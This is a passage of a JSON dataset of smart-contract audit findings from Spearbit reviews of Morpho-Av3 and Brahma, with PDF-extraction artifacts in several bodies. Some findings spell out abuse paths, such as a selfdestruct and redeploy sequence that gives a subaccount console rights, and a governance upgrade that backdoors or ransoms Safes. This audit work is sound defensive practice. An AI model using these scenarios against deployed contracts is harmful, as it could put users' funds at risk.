            "Morpho-Av3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider reverting the supplyCollateralLogic execution when amount.rayDivDown(poolSupplyIndex) is equal to zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "In Aave, when an AToken/VariableDebtToken is minted or burned, the transaction will revert if the amount divided by the index is equal to zero. You can see the check in the implementation of _mintScaled and _burnScaled functions in the Aave codebase. Morpho, with PR 688, has decided to prevent supply to the pool in this scenario to avoid a revert of the operation. Before the PR, if the user had supplied an amount for which amount.rayDivDown(poolSupplyIndex) would be equal to zero, the operation would have reverted at the Aave level during the mint operation of the AToken. With the PR, the operation will proceed because the supply to the Aave pool is skipped (see PoolLib.supplyToPool). Allowing this scenario in this specific context for the supplyCollateralLogic function will bring the following side effects:  The supplied user's amount will remain in Morpho's contract and will not be supplied to the Aave pool.  The user's accounting system is not updated because collateralBalance is increased by amount.rayDivDown(poolSupplyIndex) which is equal to zero. 21  If the marketBalances.collateral[onBehalf] was equal to zero (the user has never supplied the underly- ing to Morpho) the underlying token would be wrongly added to the _userCollaterals[onBehalf] storage, even if the amount supplied to Morpho (and to Aave) is equal to zero.  The user will not be able to withdraw the provided amount because the amount has not been accounted for in the storage.  Events.CollateralSupplied event is emitted even if the amount (used as an event parameter) has not been accounted to the user.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "WETHGateway does not validate the constructor's input parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The current implementation of the WETHGateway contracts does not validate the user's parameters during the constructor. In this specific case, the constructor should revert if morpho address is equal to ad- dress(0).",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing/wrong natspec, typos, minor refactors and renaming of variables to be more meaningful",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "In general, the current codebase does not cover all the functions, events, structs, or state variables with proper natspec. Below you can find a list of small specific improvements regarding typos, missing/wrong natspec, or suggestions to rename variables to a more meaningful/correct name  RewardsManager.sol#L28: consider renaming the balance variable in UserAssetBalance to scaledBalance  PositionsManagerInternal.sol#L289-L297, PositionsManagerInternal.sol#L352-L362: consider better docu- menting this part of the code because at first sight it's not crystal clear why the code is structured in this way. For more context, see the PR comment in the spearbit audit repo linked to it. 22  MorphoInternal.sol#L469-L521: consider moving the _calculateAmountToSeize function from MorphoInt- ernal to PositionsManagerInternal contract. This function is only used internally by the PositionsMan- agerInternal. Note that there could be more instances of these kinds of \"refactoring\" of the code inside other contracts.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "No validation checks on the newDefaultIterations struct",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The initialize function takes in a newDefaultIterations struct and does not perform validation for any of its fields.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "No validation check for newPositionsManager address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The initialize function does not ensure that the newPositionsManager is not a 0 address.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing Natspec function documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The repayLogic function currently has Natspec documentation for every function argument except for the repayer argument.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "approveManagerWithSig user experience could be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "With the current implementation of the approveManagerWithSig signers must wait that the previous signers have consumed the nonce to be able to call approveManagerWithSig. Inside the function, there's a specific check that will revert if the signature has been signed with a nonce that is not equal to the current one assigned to the delegator, this means that signatures that use \"future\" nonce will not be able to be approved until previous nonce has been consumed. uint256 usedNonce = _userNonce[signatory]++; if (nonce != usedNonce) revert Errors.InvalidNonce(); Let's make an example: delegator want to allow 2 managers via signature 1) Generate sig_0 for manager1 with nonce_0. 2) Generate sig_1 for manager2 with nonce_1. 3) If no-one executes approveManagerWithSig(sig_0) the sig_1 (and all the signatures based on incremented nonces) cannot be executed. It's true that at some point someone/the signer will execute it.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing user markets check when liquidating",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The liquidation does not check if the user who gets liquidated actually joined the collateral and borrow markets.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider reverting instead of returning zero inside repayLogic, withdrawLogic, withdrawCollater- alLogic and liquidateLogic function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Position manager always checks the user inputs via different validation functions. One of the vali- dations is that the input's amount must be greater than zero, otherwise, the transaction reverts with revert Er- rors.AmountIsZero(). The same behavior is not followed in those cases where the re-calculated amount is still zero. For example, in repayLogic after re-calculating the max amount that can be repaid by executing amount = Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount); In this case, Morpho simply executes if (amount == 0) return 0; Note that liquidateLogic should be handled differently because both the borrow amount and/or the collateral amount could be equal to zero. In this case, it would be better to revert with a different custom error based on which of the two amounts are equal to zero.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "PERMIT2 operations like transferFrom2 and simplePermit2 will revert if amount is greater than type(uint160).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Both Morpho.sol and PositionsManager.sol uses the Permit2 lib. The current implementation of the permit2 lib explicitly restricts the amount of token to uint160 by calling amount.toUint160() On Morpho, the amount is expressed as a uint256 and the user could, in theory, pass an amount that is greater than type(uint160).max. By doing so, the transaction would revert when it interacts with the permit2 lib.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Both _wrapETH and _unwrapAndTransferETH do not check if the amount is zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Both _wrapETH and _unwrapAndTransferETH are not checking if the amount amount of tokens is greater than zero. If the amount is equal to zero, Morpho should avoid making the external call or simply revert.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document further contraints on BucketDLL's insert and remove functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Besides the constraint that id may not be zero, there are further constraints that are required for the insert and remove functions to work correctly:  insert: \"This function should not be called with an _id that is already in the list.\" Otherwise, it would overwrite the existing _id.  remove: \"This function should not be called with an _id that is not in the list.\" Otherwise, it would set all of _list.accounts[0] to address(0), i.e., mark the list as empty.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Governance can remove policy check due to upgradability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Governance has the possiblity to upgrade the values for several configurations. This allows circum- venting the Policy checks, due to a bug, mistake, or malicious behaviour. Combined with a lack of security or checks on other places (e.g. multisig signers, too low a threshold) funds could be lost or stolen. _getAuthorizedAddress(_TRANSACTION_VALIDATOR_HASH) _getAuthorizedAddress(_TRUSTED_VALIDATOR_HASH) _getAuthorizedAddress(_POLICY_VALIDATOR_HASH)",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Governance can backdoor new Safes via malicious upgrade",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The SafeDeployer contract is responsible for deploying and configuring new \"top-level\" console accounts and sub-accounts. These are initialized via the authorized safe factory address with the authorized reference singleton (the implementation contract for Safe multi-signature wallets). These addresses upon which the SafeDeployer relies can be set by the governance address of the AddressProvider. Malicious governance could manipulate these addresses to have new accounts be deployed with an invalid, faulty or even backdoored safe, meaning users could start unsuspectingly using their accounts and one day unsuspect- ingly be exploited by a backdoor that governance previously installed. This could be obfuscated by making the malicious configuration part of a sandwich attack whereby deploying transactions are wrapped with 2 transactions that set and unset the malicious variants, this would prevent users from detecting this by simply querying and verifying the address configured in the AddressProvider. The likelihood for this happening is low, but if it would happen the impact for the users is high. Therefore we've set this to medium risk.",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Changes in modules not detected",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The function validatePostExecutorTransaction() checks the executor plugin is still enabled. However other modules are not checked. As modules are very powerful, it they would be \"sneaked\" in, they would pose risks to the safes. function validatePostExecutorTransaction(address, /*msgSender */ address account) external view { // ... // Check if account has executor plugin still enabled as a module on it if (!IGnosisSafe(account).isModuleEnabled(AddressProviderService._getAuthorizedAddress(_EXECUTOR_PL c UGIN_HASH))) { revert InvalidExecutorPlugin(); } // ... ,! ,! }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Governance can brick Safes by blocking moderator override",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The SafeModeratorOverridable contract is a guard that enables additional per-transaction valida- tion for safes via the policy validator accessed via the transaction validator. Unlike its SafeModerator counterpart, SafeModeratorOverridable is meant to be overridable allowing the safe owners to override and disable it by setting the guard back to zero. This is done by: 1. Checking if the attempted safe call is a call to setGuard(address(0)). 2. Skipping further transaction validation. The issue with this system is that the override logic is implemented in the separate TransactionValidator contract which is simply called by the safe moderator. The source of truth for the address of the transaction validator is the AddressProvider which the governance address can change. This allows a malicious governance address to effectively take all safes hostage by e.g. changing the \"authorized transaction validator\" to a contract that blocks all transactions unless a specific \"release ransom\" is paid.",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Subaccount can be console account",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Suppose someone sets up a pseudo subaccount safe by directly calling createProxyWithNonce(), with the same parameters that would be used to create a subAccount. Then he uses this pseudo subaccount safe to call registerWallet(). This will be possible because subAccountToWallet[] hasn't been filled for this pseudo subaccount safe. Next he removes the pseudo subaccount safe via selfdestruct. After this he creates a subaccount via deploySubAccount(), which result in the same address. The result is that the subaccount is also a console account. function registerSubAccount(address _wallet, address _subAccount) external { if (msg.sender != AddressProviderService._getAuthorizedAddress(_SAFE_DEPLOYER_HASH)) revert InvalidSender(); if (subAccountToWallet[_subAccount] != address(0)) revert AlreadyRegistered(); subAccountToWallet[_subAccount] = _wallet; walletToSubAccountList[_wallet].push(_subAccount); emit RegisterSubAccount(_wallet, _subAccount); ,! } This will make other functions work in an unexected way. For example _validateMsgSenderConsoleAccount() will return true and allow a subaccount to do registerExecutor(). function _validateMsgSenderConsoleAccount(address _account) internal view { // ... // msg.sender is console account if (msg.sender == _account && _walletRegistry.isWallet(msg.sender)) return; // ... } Also updatePolicy() will allow the subaccount to update a policy. function updatePolicy(address account, bytes32 policyCommit) external { // ... } else if (msg.sender == account && walletRegistry.isWallet(account)) { // In case invoker is a registered wallet } else { revert UnauthorizedPolicyUpdate(); } // solhint-enable no-empty-blocks _updatePolicy(account, policyCommit, currentCommit); }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "registerWallet() doesn't verify the wallet is a real Safe",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "A wallet can register itself via registerWallet(). However no check is done this wallet is actually a Safe. Also no check is done this wallet has a supperted version. As the Brahma logic uses low level details of the Safe not all versions are supported, for example the future 1.5.x versions will not automatically be supported. This could potentially leave subaccounts, that are derived from the wallet, unprotected. function registerWallet() external { if (isWallet[msg.sender]) revert AlreadyRegistered(); if (subAccountToWallet[msg.sender] != address(0)) revert IsSubAccount(); isWallet[msg.sender] = true; emit RegisterWallet(msg.sender); } Note The risk would be for the safe that registers itself. However if a user (accidentally) registers a not supported safe (very old or very new), unexpected issues could occur. The probability of the combination that a not supported safe is registired and also unrecoverable issues occur is low. However if it would happen then the impact for the safe would be high as the funds might be lost or inaccessible. Therefore we set the severity to medium.",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Upgrade of trustedValidator could circumvent Policy checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "If the trustedValidator is a smart contract, then its called via isValidSignature. If it is a contract it could be upgraded via:  _getAuthorizedAddress(_TRUSTED_VALIDATOR_HASH).  Or, if it is deployed via a proxy, the proxy could be upgraded. If there would be a bug in the trustedValidator contract or it is maliciously upgraded then Policy checks could be circumvented. function isPolicySignatureValid(address account, bytes32 executionStructHash, bytes calldata ,! signatures) ... { return SignatureCheckerLib.isValidSignatureNow(trustedValidator, txnValidityDigest, validatorSignature); ,! } function isValidSignatureNow(address signer, bytes32 hash, bytes memory signature) ... { // ... mstore(m, f) // // ... staticcall(  bytes4(keccak256(\"isValidSignature(bytes32,bytes)\")) .    signer gas(), // Remaining gas. signer, // The m, // Offset of calldata in memory. add(returndatasize(), 0x44), // Length of calldata in memory. d, // Offset of returndata. 0x20 // Length of returndata to write. address. ) // ... }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Console can brick its sub accounts in some scenarios if it removes itself as a module",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "If the console detaches itself as a module from its sub account that sub account will be bricked since the console is still attached to the subaccount in the wallet registry and the sub account guard has a post tx check for this requirement (the same check exists for execution plugin module): function _checkSubAccountSecurityConfig(address _subAccount) internal view { // ... address ownerConsole = WalletRegistry(AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH)).subAccountToWallet(_ c ,! subAccount); // Ensure owner console as a module has not been disabled if (!IGnosisSafe(_subAccount).isModuleEnabled(ownerConsole)) revert InvalidModule(); } 9 And so all submitted transaction to the sub account will be reverted with InvalidModule().",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Anyone can deploy a console with the same set of parameters but with a different _policyCommit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Anyone can set the first _policyCommit for a console by deploying it first with the desired parameters as what the original owners of the safe want. This is due to the fact that the PolicyRegistry allows the SafeDeployer to provide non-zero _policyCommit for the console when the already stored value for this parameter is bytes32(0): function updatePolicy(address account, bytes32 policyCommit) external { // ... if ( currentCommit == bytes32(0) && msg.sender == AddressProviderService._getAuthorizedAddress(_SAFE_DEPLOYER_HASH) ) { // In case invoker is safe deployer } // ... }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Changes between signing and execution could yield results that are outside the bounds of the policy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "In theory things could have changed between the signing by the trusted validator and the execu- tion of the transaction. For example code that depends on a timestamp. Or a transaction that has justed executed before this one (frontrunning or sandwiching) and has influenced for the value of a token. Or a transaction which is executed via a module without updating the Safe nonce. This way the transaction could yield results that are outside the bounds of the policy. Note: as the project informed us the current polices are based on outflows of tokens, which well not be influenced by this risk:  The policy limits the amount of tokens send.  If too few tokens are available the transaction reverts. 10",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function updatePolicy() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Accessing msg.sender is cheaper than accessing a memory variable. So if a variable is certain the to equal to msg.sender it can be replaced by msg.sender. function updatePolicy(address account, bytes32 policyCommit) external { // ... if (msg.sender == account && walletRegistry.isWallet(account)) { // ... } }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary custom getters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "authorizedAddresses and registries are already public storage variable so custom getter func- tions are not necessary. contract AddressProvider { mapping(bytes32 => address) public authorizedAddresses; mapping(bytes32 => address) public registries; function getAuthorizedAddress(bytes32 _key) external view returns (address) { return authorizedAddresses[_key]; } function getRegistry(bytes32 _key) external view returns (address) { return registries[_key]; } // ... 11 walletToSubAccountList is already a public storage variable so custom getter functions are not necessary. The getter function created would be of the form: /// YUL function getter_fun_walletToSubAccountList_ID(wallet, subAccountIndex) -> subAccount The function getSubAccountsForWallet() does have the added advantage that it retrieves an entire list, but this also contains the risk of an out of gas error if the list grows too long. contract WalletRegistry is AddressProviderService { mapping(address wallet => address[] subAccountList) public walletToSubAccountList; function getSubAccountsForWallet(address _wallet) external view returns (address[] memory) { return walletToSubAccountList[_wallet]; } }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use of storage for immutable registry addresses in AddressProvider",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The AddressProvider manages two separate key-value stores. One is the mutable authorized address store and the address the registry store (mapping(bytes32 => address) public registries). Unlike authorized addresses however the registry values in the registry store are immutable, once set they cannot be changed: _ensureAddressProvider(_registry); if (registries[_key] != address(0)) revert RegistryAlreadyExists(); registries[_key] = _registry; Note: that _ensureAddressProvider calls the _registry address and checks a return value implicitly verifying that the _registry address is not zero. This means that using storage for the AddressProvider contract have to trigger a storage read and have to do an added external call, this is an unnecessary expense considering the addresses are essentially immutable. these addresses is quite inefficient because the consumers of",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unneeded helper contract SafeEnabler",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Currently in the SafeDeployer the initializer call for newly deployed safes is aimed at the standard multi-send, the sub-calls for which are the actual initializing calls. Some of the calls are delegate-calls to the SafeEnabler helper contract which copies the storage layout and is used to directly add modules and guards. Note In the diagram iv. H doesn't represent a function call but merely a storage update. However, a separate contract is not only not required for this but adds gas overhead because of the separate cold address access and authorized address retrieval that needs to be done for this contract. The methods contained within SafeEnabler are almost full 1:1 copies of the original Safe logic and can just be called directly. Beyond added complexity and gas inefficiency, this approach has the added downside of increasing 13 attack surface. Mimicking the storage layout of another contract is prone to subtle, difficult-to-detect errors that can have critical impacts.",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Access msg.sender within the function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Using msg.sender internally within the _setupSubAccount function rather than passing it as an argument can save gas. _subAcc = _createSafe(_owners, _setupSubAccount(_owners, _threshold, msg.sender), _salt);",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Location of _genNonce() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The function _createSafe() has two instances of the call to _genNonce(). They can be combined to save some deployment gas. function _createSafe(address[] calldata _owners, bytes memory _initializer, bytes32 _salt) ... { // ... uint256 nonce = _genNonce(ownersHash, _salt); do { try ...createProxyWithNonce(...) returns (...) { _safe = ... } catch Error(string memory reason) { // ... nonce = _genNonce(ownersHash, _salt); // ... } } while (_safe == address(0)); }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function isPolicySignatureValid() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The function isPolicySignatureValid() uses assembly which can be replaced with Solidity. Addi- tionally the check for the code length can only be done only when necessary to save some gas. function isPolicySignatureValid(...) ... { // ... assembly { _codesize := extcodesize(trustedValidator) } if (_codesize == 0 && validatorSignature.length == 0) { revert ... } }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Check for lacking policies can be done earlier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Suppose a console account does not have any policies. The console account allows an execu- tor to make module transactions on behalf of his console account. However, without any policies, the hook (validatePostExecutorTransaction ! _checkConsoleAccountSecurityConfig) will always revert whenever the executor tries to execute a transaction as the guard and/or fallbackHandler are not initialized. function _checkConsoleAccountSecurityConfig(address _consoleAccount) internal view { address guard = SafeHelper._getGuard(_consoleAccount); address fallbackHandler = SafeHelper._getFallbackHandler(_consoleAccount); // Ensure guard has not been disabled if (guard != AddressProviderService._getAuthorizedAddress(_SAFE_MODERATOR_OVERRIDABLE_HASH)) { revert InvalidGuard(); } // Ensure fallback handler has not been altered if (fallbackHandler != AddressProviderService._getAuthorizedAddress(_CONSOLE_FALLBACK_HANDLER_HASH)) { revert InvalidFallbackHandler(); } ,! }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Addresses retrieved twice in executeTransaction() and validatePostExecutorTransaction()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Both the functions executeTransaction() and _validateExecutionRequest() retrieve the Trans- actionValidator address. This could be combined and the address could be supplied to _validateExecution- Request(), to save some gas. function executeTransaction(ExecutionRequest calldata execRequest) external nonReentrant returns (bytes ,! memory) { _validateExecutionRequest(execRequest); // ... TransactionValidator(AddressProviderService._getAuthorizedAddress(_TRANSACTION_VALIDATOR_HASH)) .validatePostExecutorTransaction(...); return txnResult; } function _validateExecutionRequest(ExecutionRequest calldata execRequest) internal { // ... TransactionValidator(AddressProviderService._getAuthorizedAddress(_TRANSACTION_VALIDATOR_HASH)) .validatePreExecutorTransaction(...); } 18 functions Both retrieve the WalletRegistry address. _checkSubAccountSecurityConfig(), to save some gas. validatePostExecutorTransaction() _checkSubAccountSecurityConfig() This could be combined and the address could be supplied to and function validatePostExecutorTransaction(address, /*msgSender */ address account) external view { WalletRegistry _walletRegistry = WalletRegistry(AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH)); ,! // ... _checkSubAccountSecurityConfig(account); // ... } function _checkSubAccountSecurityConfig(address _subAccount) internal view { // ... address ownerConsole = WalletRegistry(AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH)) .subAccountToWallet(_subAccount); // ... } function validatePostTransaction(bytes32, /*txHash */ bool, /*success */ address subAccount) external ,! view { _checkSubAccountSecurityConfig(subAccount); // also has to be adapted } Warning In case the value of _getAuthorizedAddress(...) would be updated as a side effect of one of the function calls the results wouldn't be identical. However shouldn't happen. Also see issue Governance can remove policy check due to upgradability.",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "keccak256 result can be cached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The current implementation redundantly recalculates keccak256(_data) on each execution. if (SafeHelper._GUARD_REMOVAL_CALLDATA_HASH == keccak256(_data)) { return true; } else if (SafeHelper._FALLBACK_REMOVAL_CALLDATA_HASH == keccak256(_data)) {",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function updatePolicy can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "Within function updatePolicy(), the retrieval of the walletRegistry could be moved inside the else statement, to only retrieve it when necessary. This saves some gas. function updatePolicy(address account, bytes32 policyCommit) external { ,! // ... WalletRegistry walletRegistry = WalletRegistry(AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH)); // ... if (currentCommit == bytes32(0) && msg.sender == } else if (walletRegistry.subAccountToWallet(account) == msg.sender) { } else if (msg.sender == account && walletRegistry.isWallet(account)) { } else { ... ) { revert UnauthorizedPolicyUpdate(); } // ... }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Suggestions for the deployment script ConsoleFactory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": " ConsoleFactory.s.sol#L75, in 2 extra addresses are provided to create3Deploy(...) since AddressProvider's constructor only takes one argument.  ConsoleFactory.s.sol#L166, _overrideCheck is true: logic check for consoleFallbackHandler has been skipped since /// @dev skips checks for supported if (!_overrideCheck) {  addressProvider()  if  _overrideCheck is true  /// @dev skips checks for supported if (_authorizedAddress.code.length != 0) _ensureAddressProvider(_authorizedAddress); _authorizedAddress addressProvider() if is an EOA     }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Initialization of hashes in Constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The contract Constants contains several constants that are initialized via a hex string. They could also be initialized via a keccak256 expression, which would make the code easier to maintain and verify. Perhaps this is the result of previous optimizations. With optimization of the SOLC switch on this, it shouldn't make a difference. Additionally the hashes, which are determined by the Brahma protocol (and thus don't have to match a value in the Safe contracts), can be prefixed by a protocol specific path. This is to prevent that values are accidentally reused. abstract contract Constants { // ... /// @notice keccak256(\"ExecutorRegistry\") bytes32 internal constant _EXECUTOR_REGISTRY_HASH = 0x165eedff3947ccfbe9739de5f67209b9935e684faef9ce859fb3dc46d33317f1; // ... }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Enum conversion in _packMultisendTxns() not obvious",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "The logic to convert from Enum Operation to Enum CallType is fragile to future changes in the enum. If any enum variants are added they'd fall through the check and cause the call variable to default 0. contract Enum { enum Operation { Call, DelegateCall } } interface Types { enum CallType { CALL, DELEGATECALL, STATICCALL } } function _packMultisendTxns(Types.Executable[] memory _txns) internal pure returns (bytes memory ,! packedTxns) { // ... uint8 call; // initially 0 and thus CALL if (_txns[i].callType == Types.CallType.DELEGATECALL) { call = uint8(Enum.Operation.DelegateCall); } else if (_txns[i].callType == Types.CallType.STATICCALL) { revert InvalidMultiSendCall(i); } // ... }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "How to recover from a bug in ExecutorPlugin",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
        "body": "In case a bug is found in ExecutorPlugin it will be difficult to replace this:  All Safes would have to remove the old ExecutorPlugin from the list of modules and install a new one;  The old anymore ExecutorPlugindoesn't work rizedAddress(_EXECUTOR_PLUGIN_HASH) is updated, validatePostExecutorTransaction(), which refers to the new ExecutorPlugin. once due to the isModuleEnabled() check AddressProviderService._getAutho- in  This is good when a bug is present but  disableExecutorPluginOnSubAccount(...) can't be used anymore function enableExecutorPluginOnSubAccount(address subAccount, address[] memory executors) ... { // ... ... IGnosisSafe.enableModule, (AddressProviderService._getAuthorizedAddress(_EXECUTOR_PLUGIN_HASH)) ... // ... ,! } function disableExecutorPluginOnSubAccount(address subAccount, address previousModule) ... { // ... .. IGnosisSafe.disableModule,previousModule, AddressProviderService._getAuthorizedAddress(_EXECUTOR_PLUGIN_HASH)) ... // ... ,! } function validatePostExecutorTransaction(address, /*msgSender */ address account) external view { // ... // Check if account has executor plugin still enabled as a module on it if (!IGnosisSafe(account).isModuleEnabled(AddressProviderService._getAuthorizedAddress(_EXECUTOR_PL c UGIN_HASH))) { revert InvalidExecutorPlugin(); } // ... ,! ,! }",
        "labels": [
            "Spearbit",
            "Brahma",
            "Severity: Informational"
        ]
    },
    {
        "title": "Re-implementation of Ownership with 2-step transfer pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf",
